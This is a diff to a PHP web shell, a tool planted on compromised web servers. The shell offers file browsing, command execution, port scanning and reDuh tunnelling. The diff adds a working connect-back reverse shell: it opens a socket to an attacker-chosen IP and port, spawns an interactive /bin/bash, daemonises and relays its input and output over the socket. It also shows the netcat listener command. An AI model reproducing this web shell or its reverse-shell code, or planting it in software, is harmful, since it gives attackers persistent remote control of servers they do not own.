@@ -9,6 +9,20 @@ define('MODE', (isset($_GET['mode']) ? $_GET['mode'] : (isset($_POST['mode']) ? 
 
 function p($data) { echo '<pre>'. print_r($data, true) .'</pre>'; }
 
+function _print($type, $str)
+{
+	switch ($type)
+	{
+		case 'err': $color = 'red'; $ret = '[-]'; break;
+		case 'info': $color = '#aaaaaa'; $ret = '[i]'; break;
+		case 'success': $color = 'green'; $ret = '[+]'; break;
+		default: $color = 'black'; $ret = '[+]'; break;
+	}
+	
+	echo "<span style=\"color: $color;\">". $ret .' '. $str ."</span><br />\n";
+	@flush();
+}
+
 function getfperms($file)
 {
   $perms = @fileperms($file);
@@ -37,7 +51,7 @@ function getfperms($file)
 function _link($params = array())
 {
 	$tab = isset($_SERVER['QUERY_STRING']) ? array_unique(explode('&', $_SERVER['QUERY_STRING'])) : array();
-	$script_tags = array('mode', 'portscan', 'reduh', 'e', 'v', 's', 'd', 'l', 'r');
+	$script_tags = array('mode', 'portscan', 'reduh', 'rshell', 'e', 'v', 's', 'd', 'l', 'r');
 	$ret = SCRIPT_NAME .'?';
 	
 	foreach ($params as $k => $v)
@@ -115,6 +129,30 @@ function system_drives()
 	}
 	
 	return $drives;
+}
+
+function navbar($cwd)
+{
+	$ret = '<p>';
+	if (MODE == 'browser' and !isset($_GET['portscan']) and !isset($_GET['reduh'])) $ret .= 'browser - ';
+	else $ret .= '<a href="'. _link(array('mode' => 'browser')) .'" class="menu">browser</a> - ';
+	
+	$ret .= '<a href="" onclick="javascript:window.open(\''. _link(array('mode' => 'shell')) .
+		'\', \'Shell\', \'width=850,height=440,toolbar=no,scrollbars=no\'); return false;" class="menu">webshell</a> - ';
+	
+	$ret .= '<a href="'. _link(array('mode' => 'phpinfo')) .'" class="menu">phpinfo</a> - ';
+	
+	if (isset($_GET['rshell'])) $ret .= 'connect-back shell - ';
+	else $ret .= '<a href="'. _link(array('mode' => 'browser', 'd' => $cwd, 'rshell' => 1)) .'" class="menu">connect-back shell</a> - ';
+	
+	if (isset($_GET['portscan'])) $ret .= 'portscan - ';
+	else $ret .= '<a href="'. _link(array('mode' => 'browser', 'd' => $cwd, 'portscan' => 1)) .'" class="menu">portscan</a> - ';
+	
+	if (isset($_GET['reduh'])) $ret .= 'reduh';
+	else $ret .= '<a href="'. _link(array('mode' => 'browser', 'd' => $cwd, 'reduh' => 1)) .'" class="menu">reduh</a>';
+	$ret .= '</p>';
+	
+	return $ret;
 }
 
 if (AUTHENT == true and !isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER']) !== USER_HASH || md5($_SERVER['PHP_AUTH_PW']) !== PASS_HASH)
@@ -282,16 +320,8 @@ if (MODE == 'shell')
 if (MODE == 'browser')
 {
 	$id = get_current_user() .'@'. gethostname();
-
 	echo $html_header . $css . '<h4>php browser - '. $id .'</h4>';
-	echo '<p>'. ((MODE == 'browser' and !isset($_GET['portscan']) and !isset($_GET['reduh'])) ? 'browser' : 
-		'<a href="'. _link(array('mode' => 'browser')) .'" class="menu">browser</a>') .' - '. 
-		(MODE == 'shell' ? 'shell' : '<a href="" onclick="javascript:window.open(\''. _link(array('mode' => 'shell')) .
-		'\', \'Shell\', \'width=850,height=440,toolbar=no,scrollbars=no\'); return false;" class="menu">shell</a>') .' - '.
-		(MODE == 'tools' ? 'tools' : '<a href="'. _link(array('mode' => 'phpinfo')) .'" class="menu">phpinfo</a>') .' - ' .
-		(isset($_GET['portscan']) ? 'portscan' : '<a href="'. _link(array('mode' => 'browser', 'd' => $cwd, 'portscan' => 1)) .'" class="menu">portscan</a>') .' - ' .
-		(isset($_GET['reduh']) ? 'reduh' : '<a href="'. _link(array('mode' => 'browser', 'd' => $cwd, 'reduh' => 1)) .'" class="menu">reduh</a>') .'</p>';
-		
+	echo navbar($cwd);
 	echo '<br><br>
 	<table height=700 border="0">
 	  <tr>
@@ -311,6 +341,7 @@ if (MODE == 'browser')
 			echo 'reDuh server available at "'. $cwd .'/reduh.php"';
 		}
 	}
+	
 	elseif (isset($_GET['portscan']))
 	{
 		if (!isset($_POST['run_portscan']))
@@ -325,6 +356,7 @@ if (MODE == 'browser')
 			<input type="hidden" name="run_portscan" value="1" /><br>
 			<input type=submit name=submit value="Run TCP port scan"></form>';
 		}
+		
 		else
 		{
 			@set_time_limit(0);
@@ -377,6 +409,115 @@ if (MODE == 'browser')
 			echo "</pre>";
 		}
 	}
+	
+	elseif (isset($_GET['rshell']))
+	{
+		if (!isset($_POST['run_rshell']))
+		{
+			echo "<h5 style=\"font-size:14px;\">Connect-back PHP Shell</h5>";
+			echo '<p>This is a fully-interactive shell over TCP.<br />
+			For more info see this page: <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</a></p>';
+			echo '<form action="" method="post">
+			Connect back to IP: <input type=text name="rshell_ip" value="192.168.0.1" size=12>:<input type="text" name="rshell_port" value="4242" size=5><br><br>
+			Shell to spawn: <input type=text name="rshell_path" value="/bin/bash" size=10><br><br>
+			<input type="hidden" name="run_rshell" value="1" /><br>
+			<b>1: On the server receiving the reverse shell, run:</b><br /><br />
+			<code>nc -l -p <port> -vv</code><br /><br /><br />
+			<b>2: </b><input type=submit name=submit value="Run Reverse Shell"></form>';
+		}
+		
+		else
+		{
+			_print('info', 'Running reverse shell...');
+			/* Begin reverse shell code */
+			set_time_limit(0);
+			$VERSION = "1.0";
+			$ip = $_POST['rshell_ip'];
+			$port = intval($_POST['rshell_port']);
+			$chunk_size = 1400;
+			$write_a = null;
+			$error_a = null;
+			$shell = 'uname -a; '. strip_tags($_POST['rshell_path']) .' -i';
+			$daemon = 0;
+			$debug = 1;
+
+			if (function_exists('pcntl_fork')) {
+				$pid = pcntl_fork();
+				if ($pid == -1 && !$daemon) {
+					_print('error',  'Can\'t fork');
+					exit(1);
+				}
+				if ($pid) exit(0);
+				if (posix_setsid() == -1 && !$daemon) {
+					_print('error', 'Can\'t setsid()');
+					exit(1);
+				}
+				$daemon = 1;
+			} elseif (!$daemon) _print('error', 'Failed to daemonise.  This is quite common and not fatal.');
+			
+			chdir("/");
+			umask(0);
+			
+			$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+			if (!$sock && !$daemon) {
+				_print('error',  "$errstr ($errno)");
+				exit(1);
+			}
+			
+			$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
+			$process = proc_open($shell, $descriptorspec, $pipes);
+			if (!is_resource($process) && !$daemon) {
+				_print('error', 'Can\'t spawn shell');
+				exit(1);
+			}
+			stream_set_blocking($pipes[0], 0);
+			stream_set_blocking($pipes[1], 0);
+			stream_set_blocking($pipes[2], 0);
+			stream_set_blocking($sock, 0);
+			if (!$daemon) _print('success',  "Successfully opened reverse shell to $ip:$port");
+
+			while (1) {
+				if (feof($sock) && !$daemon) {
+					_print('error', 'Shell connection terminated');
+					break;
+				}
+				if (feof($pipes[1]) && !$daemon) {
+					_print('error', 'Shell process terminated');
+					break;
+				}
+				$read_a = array($sock, $pipes[1], $pipes[2]);
+				$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+				
+				if (in_array($sock, $read_a)) {
+					if ($debug && !$daemon) _print('info', 'SOCK READ');
+					$input = fread($sock, $chunk_size);
+					if ($debug && !$daemon) _print('info', "SOCK: $input");
+					fwrite($pipes[0], $input);
+				}
+
+				if (in_array($pipes[1], $read_a)) {
+					if ($debug && !$daemon) _print('info', "STDOUT READ");
+					$input = fread($pipes[1], $chunk_size);
+					if ($debug && !$daemon) _print('info', "STDOUT: $input");
+					fwrite($sock, $input);
+				}
+
+				if (in_array($pipes[2], $read_a)) {
+					if ($debug && !$daemon) _print('info', "STDERR READ");
+					$input = fread($pipes[2], $chunk_size);
+					if ($debug && !$daemon) _print('info', "STDERR: $input");
+					fwrite($sock, $input);
+				}
+			}
+
+			fclose($sock);
+			fclose($pipes[0]);
+			fclose($pipes[1]);
+			fclose($pipes[2]);
+			proc_close($process);
+		}
+	}
+	
 	else
 	{
 		$list = @scandir('.');
